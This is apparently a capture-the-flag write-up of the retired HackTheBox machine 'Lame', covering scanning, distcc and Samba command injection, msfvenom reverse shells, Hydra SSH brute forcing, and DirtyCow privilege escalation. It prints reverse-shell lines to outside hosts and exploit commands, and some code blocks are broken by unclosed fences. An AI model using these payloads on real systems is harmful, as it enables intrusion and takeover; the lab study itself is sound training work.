This machine can be accessed on [HackTheBox](https://app.hackthebox.com/machines/Lame) in the Retired Machines section.

Please note that while the information in this article will help you complete the challenge and get both flags on the box, it won't be written in a clear-cut how-to style. Instead, it will describe my thought process and the steps I took to solve the box.

This, in my opinion, gives more value than merely giving you step by step instructions.

The article will include both Metasploit and non-Metasploit solutions, and it might be solved in a different way than the intended path. 

For OSCP, solving it without Metasploit is a useful exercise.

## **Scanning & Enumeration**

### **Running Nmap**

```bash
nmap -sV -sC -oA nmap/top1000 10.10.10.3 -vv

-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
-oA <basename>: Output in the three major formats at once
-v: Increase verbosity level (use -vv or more for greater effect)
```
{: .nolineno }

We pick up on an odd thing right away. As though the host is blocking our probes and/or is protected by a firewall, our scanning produces no results. 
![Nmap scan produces no results](/assets/img/htb-lame/nmap_host_down.png)
_Nmap scan - host down_

Next, we try to ping the host but we notice it is actually responding, so definitely not blocking ICMP traffic:
![ICMP probing](/assets/img/htb-lame/icmp_probes.png)
_ICMP probes_

Let us try nmap with the `-Pn` switch to see what happens:

```bash
nmap -Pn 10.10.10.3
```
{: .nolineno }

![Nmap scanning with the -Pn switch](/assets/img/htb-lame/nmap_pn_switch.png)
_Nmap -Pn scan_

We do get a couple of ports open this time. Due to the fact that the host is ping responsive, it is a bit weird that I cannot scan it with the first nmap command.

When running it with sudo privileges however, we get a different result:
![Running nmap with sudo privileges](/assets/img/htb-lame/nmap_sudo.png)
_Running nmap with sudo privileges_

So the same command yields different results. Why? By default, nmap scans work like this:
- A privileged user executes a `-sS` scan (TCP SYN scan [stealth scan])
	- This type of scan requires raw socket / raw packet privileges.
- An unprivileged user executes a `-sT` scan (TCP connect scan).
	- This type of scan does not require raw socket / raw packet privileges.

If we try to execute a stealth scan in the user context, we can verify the above:
![Nmap scanning with the -sS switch as an unprivileged user](/assets/img/htb-lame/nmap_access_denied.png)
_Nmap -sS access denied_

I have decided to continue with the -Pn scan this time so I don't have to elevate my access, however it is a good idea to keep in mind this behavior. If you are stuck it is always a good idea to try and run a stealth scan to see if any ports were missed.

```bash
nmap -Pn -sC -sV -oN nmap/top1000 10.10.10.3

### **Exploring FTP Anonymous Login**

Since we can connect to the FTP server anonymously, let's try to see if we can find anything useful stored there:
![FTP Initial Access](/assets/img/htb-lame/ftp_initial.png)
_FTP initial access_

There is nothing in the FTP directory unfortunately, we can gather a few more details by running `status`:
![FTP details resulting from the status command](/assets/img/htb-lame/ftp_status.png)
_FTP status command output_

Next, we can try searching for exploits based on the version that was leaked with `searchsploit vsftpd 2.3`:
![vsftpd 2.3 exploits in Metasploit](/assets/img/htb-lame/searchsploit_vsftpd.png)
_Vsftpd exploits in Metasploit_

It seems like we have a potential Backdoor Command Execution vulnerability that we can exploit either manually or via Metasploit. We'll keep this for later. For the time being, let expand our findings by further enumerating the box.

### **Enumerating SMB with Enum4Linux**

Since SMB is open, we can try to enumerate it with `enum4linux -a 10.10.10.3`. The `-a` switch is for performing all simple enumeration tasks at once. It uses `-U -S -G -P -r -o -n` and `-i`. Check the tool manual for more information.

```
{: .nolineno }

Looking at the output we notice that there is no password policy in place and that there are two custom shared folders:

```bash
Sharename       Type      Comment
---------       ----      -------
tmp             Disk      oh noes!
opt             Disk   
```
{: .nolineno }

We can connect to the tmp folder anonymously based on the enum4linux output: 
```bash
//10.10.10.3/tmp	[35mMapping: [0mOK[35m Listing: [0mOK[35m Writing: [0mN/A`
```
{: .nolineno }

We can also list these shares ourselves by using `smbclient -L 10.10.10.3`:
![Listing SMB shares](/assets/img/htb-lame/smbclient_initial_access.png)
_Listing SMB shares_

Now, let's try connecting to that `/tmp` share we saw we have access to anonymously by running `smbclient \\\\10.10.10.3\\tmp`:
![Initial SMB access to the /tmp share](/assets/img/htb-lame/smbclient_initial_access.png)
_Accessing the /tmp share_

Whilst there is nothing of interest here at first glance, we have write access so maybe we can leverage this later by uploading a reverse shell and executing it.

## **Exploitation**

### **Attacking FTP**

Using Metasploit, we search for the FTP exploit, configure and run it:
![Configuring Metasploit exploit for vsftpd](/assets/img/htb-lame/metasploit_vsftpd.png)
_Metasploit exploit configuration for vsftpd_

We unfortunately get no shell back:
Using Metasploit, we search for the FTP exploit, configure and run it:
![Not getting a shell back due to the Metasploit exploit failing to generate one](/assets/img/htb-lame/metasploit_vsftpd_noshell.png)
_Metasploit exploit failure_

I have tried mapping the hostname we found earlier to the IP address (in `/etc/hosts`) so we can use the FQDN of the box instead, but the outcome is the same.

### Attacking SMB

Considering that we can connect to the SMB share anonymously and that we have read/write access as well as the ability to create files and folders, I then looked at the possibility of creating a `meterpreter` reverse shell and uploading it there. 

To generate the reverse shell, I have used `msfvenom`:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f elf > rev.elf
```
{: .nolineno }

I have also started a listener in `Metasploit`:

```bash
use exploit/multi/handler
set LHOST tun0
set LPORT 444
set payload linux/x86/meterpreter/reverse_tcp
run -j
```
{: .nolineno }

The reverse shell was then relocated to the temporary folder, and I attempted to add executable permissions to the file:
![Access denied when modifying file acesses on the SMB share](/assets/img/htb-lame/plusx_revelf.png)
_Access denied when modifying file accesses on the SMB share_

Unfortunately, we do not have access. It seems that at this point we can't do anything else with the current accesses that we got.

### **Attacking SSH**

It is always a good idea to try and connect to the `SSH` service on the server just to see what response you will get. Sometimes, admins can configure a banner that might leak useful information.

```bash
ssh 10.10.10.3
```
{: .nolineno }

![Unable to connect to SSH due to unsupported legacy keys](/assets/img/htb-lame/ssh_connection_error.png)
_Unable to connect to SSH_

Notice that when we connect to the SSH server we get an error. This is because the version of OpenSSH included in our release of Kali disables `ssh-dss` due to it being considered legacy.

To work around that, we have to specify what key algorithm we want to use when making the ssh connection: `ssh -oHostKeyAlgorithms=+ssh-dss 10.10.10.3` 

We can also permanently fix this by adding support to legacy keys like in [this article](https://www.infosecmatter.com/solution-for-ssh-unable-to-negotiate-errors/). 

```bash
{
echo -n 'Ciphers '
ssh -Q cipher | tr '\n' ',' | sed -e 's/,$//'; echo

echo -n 'MACs '
ssh -Q mac | tr '\n' ',' | sed -e 's/,$//'; echo

echo -n 'HostKeyAlgorithms '
ssh -Q key | tr '\n' ',' | sed -e 's/,$//'; echo

echo -n 'KexAlgorithms '
ssh -Q kex | tr '\n' ',' | sed -e 's/,$//'; echo
} >> ~/.ssh/config
```
{: .nolineno }

Now that we have done this, we are able to connect to the SSH server, but we don't really benefit from this service—no banners have been leaked, and we don't know of any users against whom we can try brute-forcing attacks. 

### When Running Out of Options

Since we are now out of options, there are a couple of other things we can try:
- run a nmap scan against all ports
- run additional enumeration scripts for the services that were discovered;
	- i.e. enum4linux for smb (already did that in this case);
- research vulnerabilities for the service versions you have detected;
- research vulnerabilities in the OS version identified during scanning.

### Re-running Nmap

In this instance, I've made the decision to restart `nmap` and obtain further information about ports outside the top 1000 most popular range. 

```bash
nmap -Pn -sC -sV -oN nmap/all -p- -vv 10.10.10.3

According to Wikipedia, in software development, `distcc` is a tool for speeding up compilation of source code by using distributed computing over a computer network. With the right configuration, distcc can dramatically reduce a project's compilation time.

Googling around for potential `distcc` exploits, we find [the following](https://www.exploit-db.com/exploits/9915).

This refers to a module already existing in `Metasploit`:
![Finding a distcc vulnerability in Metasploit](/assets/img/htb-lame/distcc_command_injection_msf.png)
_Metasploit DistCC vulnerability_

We also find a Python script on Github that can be used to exploit this command injection vulnerability [here](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855). There is also a [nmap script](https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html) that can be used to exploit this.

Now, we are runnig version 1 of `DistCC` which according to the [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687) is vulnerable.

### Exploiting DistCC

Let's test the recently discovered Python exploit. Please take note that we read through the script's help page to determine the settings we needed to adapt for our requirements.

```bash
python distccd.py -t 10.10.10.3 -p 3632 -c 'whoami'
```
{: .nolineno }

![Successfully executing remote commands via the DistCC vulnerability](/assets/img/htb-lame/distcc_command_injection2.png)
_Metasploit DistCC vulnerability exploitation_

It looks like we can successfully inject code.

```bash
python distccd.py -t 10.10.10.3 -p 3632 -c 'which nc'                     

[OK] Connected to remote service
--- BEGIN BUFFER ---

/bin/nc

--- END BUFFER ---
[OK] Done.
```
{: .nolineno }

Here, I am checking to see if netcat is available so we can use a bind shell to gain shell access and potentially improve it to a meterpreter shell by running the elf file we've already created and stored in the SMB share.

Let's keep that in mind for now and do some further enumeration:

```bash
cat: /etc/sudoers: Permission denied

pwd: /tmp

ls:la

total 44
drwxrwxrwt  8 root     root    4096 Oct  6 09:33 .

drwx------  2 root     root    4096 Oct  5 09:21 vmware-root
```
{: .nolineno }

It looks like we have read access to both the root home folder and the user named makis home folder.
![Testing access to the root user folder](/assets/img/htb-lame/lslaroot.png)
_File access listings for /root_

![Testing access to the makis user folder](/assets/img/htb-lame/lslamakis.png)
_File access listings For /home/makis_

It turns out that we can easily read the `user flag`, but we don't have access to the `root flag`.

### Gaining Access

Checking the permissions structure of the folders, I have noticed that by default we are dropped inside the /tmp folder to which we have full access:
![Checking access to the /tmp folder](/assets/img/htb-lame/tmpfolder_access.png)
_File access listings for the /tmp folder_

Since we can do everything in this folder, I have copied the `rev.elf` reverse shell generated previously and modified it accordingly so it has execute rights.

I have then started a Metasploit listener like shown previously and executed the payload:
![Executing the reverse shell](/assets/img/htb-lame/executing_rev.png)
_Adding execute permissions to our payload_

![Gaining a Meterpreter shell](/assets/img/htb-lame/meterpreter_rev.png)
_Gaining a Meterpreter reverse shell_

Next, I am going to upload `LinPeas` to try and further enumerate the box.

Note that in this case I have chosen to have a Meterpreter reverse shell for ease of uploading and downloading files from the vulnerable machine, however, it does not make much difference when you switch to a bash shell by running `shell`. To avoid using Metasploit, the payload can be generated as a regular `linux/x86/shell_reverse_tcp` shell after which you can start a listener with `nc -lvnp [port]`. There are also pure bash reverse shells that can be generated as well - a good cheatsheet can be found [here](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux){:target="_blank"}.

There appear to be several options that we can explore: 
- using nmap SUID
- using at SUID/SGID which we own
- using NFS Exports NO_ROOT_SQUASH
- checking mysql since we can log in as root without a password

A very interesting [mysql root shell exploit](https://rootrecipe.medium.com/mysql-to-system-root-ad8edc305d2b) can be seen below:

```bash
mysql> use mysql;mysql> 
create table potato(line blob);
mysql> insert into potato values(load_file('/tmp/lib_mysqludf_sys.so'));
mysql> select * from potato into dumpfile '/usr/lib/lib_mysqludf_sys.so';
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
mysql> select sys_exec('bash -i >& /dev/tcp/192.168.1.99/443 0>&1');
```
Unfortunately, we don't have write access to `/usr/lib` and we cannot create the `.so` file.

Checking all the tables, we do find user accounts and passwords but not for the users that we know exist on the box.

```sql
mysql> show databases;
show databases;

{: .nolineno }

I have went through the SUID/SGID exploits but the ones we have require sudo or at least to know the password of the currently logged in user which we don't.

We also looked at the no root squash PE vector, and from what I could gather, the way it works is by mounting an NFS share on the victim machine from the attacker machine. The share and any files we place in it will retain their original rights because root squash is not configured. It will be mapped as root on the victim system if we create and mount it with a root account on the attacking machine. Then, whenever we execute bash, it will run root. Read more about root squashing [here.](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe) 

I was unable to leverage this here, as the NFS service is not installed on the victim machine. More research is needed to fully understand whether the /etc/exports file is exploitable in other way.

Next, I tried bruteforcing the SSH login since I now had valid user accounts: `makis` and `root`.

The efforts fail if we activate more than 12 child processes at once, and it would take a long time to process the rockyou.txt file, so I let it running for 1032 instances before deciding to terminate it. Smaller password files might work better for us, but for the time being, we'll just keep this in mind. 

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.3 -I -vV -t 12
hydra -l makis -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.3 -I -vV -t 12
```
{: .nolineno }

Checking the `LinPeas` output further, we have taken note of a few exploits that were suggested, one of which is [DirtyCow](https://dirtycow.ninja/) which is a pretty well known one.

A [race condition](https://en.wikipedia.org/wiki/Race_condition) was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.

The following Red Hat Product versions are impacted:
- Red Hat Enterprise Linux 5
- Red Hat Enterprise Linux 6
- Red Hat Enterprise Linux 7
- Red Hat Enterprise MRG 2
- Red Hat Openshift Online v2
- Red Hat Virtualization (RHEV-H/RHV-H)

Since that came out in 2016 I believe it would be okay to use with this machine, as the machine itself came out in 2017. In general, I'm trying to stay away from utilizing something more recent, like `PwnKit` for example, because while that's likely to succeed, doing so would defeat the purpose of solving these kind of challenges by things too simple as you will have something that works every time no matter what the challenge author had in mind when designing the box.

We'll make an effort to adhere to the machine release date and only use exploits available around that time-frame.

On the victim machine, we have the following:

```bash
daemon@lame:/root$ cat /etc/*release*
cat /etc/*release*
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"

```
{: .nolineno }

Since we have `gcc` installed, a good way to make sure an exploit will run successfully is to compile it on the victim system. In this case, compiling it on the attacker VM and moving it over will not work.

{: .nolineno }

Next, we compile it as per the instructions given on [the github repository](https://github.com/FireFart/dirtycow/blob/master/dirty.c) where we took the exploit from.

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```
{: .nolineno }

And simply run it to create a new root user.

```bash
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.
```
{: .nolineno }

Now, we can read the flag file:

```bash
firefart@lame:~# ls -la /root/root.txt
-rw------- 1 firefart root 33 2022-10-05 09:21 /root/root.txt
```

## Other Solutions

### Manual Exploitation

Checking how others solved this, it seems I went the manual route and over-complicated things a bit but all in good fun, we definitely learned new things. Apparently, the indented way was to exploit the SMB service which is vulnerable to [CVE-2007-2447](https://www.samba.org/samba/security/CVE-2007-2447.html) as we are running version 3.0.20.

There is even a Metasploit module for this:
![SMB command injection vulnerability](/assets/img/htb-lame/searchsploit_samba.png)
_SMB Command Injection exploit_

Using `searchsploit -m` we can copy the exploit locally and read its source code:
![SMB command injection exploit](/assets/img/htb-lame/samba_exploit.png)
_SMB Command Injection exploit_

We can leverage the SMB `logon` command to pass the payload and get a reverse shell as root:

```bash
smbclient //10.10.10.3/tmp
smb :\> logon "/=`nohup nc 10.10.16.2 9001 -e /bin/bash`"
```
{: .nolineno }

After setting `LHOST` and `RHOST`:

```bash
msf6 exploit(multi/samba/usermap_script) > run
